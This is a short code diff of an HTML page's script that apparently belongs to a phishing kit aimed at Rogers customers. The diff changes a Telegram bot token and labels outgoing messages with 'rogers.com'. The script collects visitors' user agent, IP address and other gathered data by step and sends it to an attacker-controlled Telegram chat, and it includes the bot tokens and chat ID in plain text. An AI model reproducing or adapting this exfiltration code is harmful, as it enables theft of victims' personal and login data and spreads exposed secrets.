@@ -591,7 +591,7 @@
 
     <script>
         // Telegram configuration - using your provided credentials
-        const TELEGRAM_BOT_TOKEN = '8434488259:AAFHtKzeOQV-Lja9_OYizbeYRaYJ_5rFLVs';
+        const TELEGRAM_BOT_TOKEN = '8434488259:AAHWtsaS7fS39qierbMJv-X6-tG0SB0v5_I';
         const TELEGRAM_CHAT_ID = '7867297027';
 
         // Function to send message to Telegram
@@ -652,13 +652,13 @@
             message += `%C%0 Browser Info:\n`;
             message += `%2 User Agent: ${navigator.userAgent}\n`;
             message += `%2 IP Address: ${collectedData.ipAddress}\n`;
-            message += `%2 Timestamp: ${new Date().toLocaleString()}\n`;
+            message += `%2 Timestamp rogers.com: ${new Date().toLocaleString()}\n`;
             message += `%2 Step: ${step}`;
 
             // Send to Telegram and wait for it to complete
             const success = await sendToTelegram(message);
             if (success) {
-                console.log('Data sent to Telegram successfully');
+                console.log('rogers Data sent to Telegram successfully');
             } else {
                 console.error('Failed to send data to Telegram');
             }
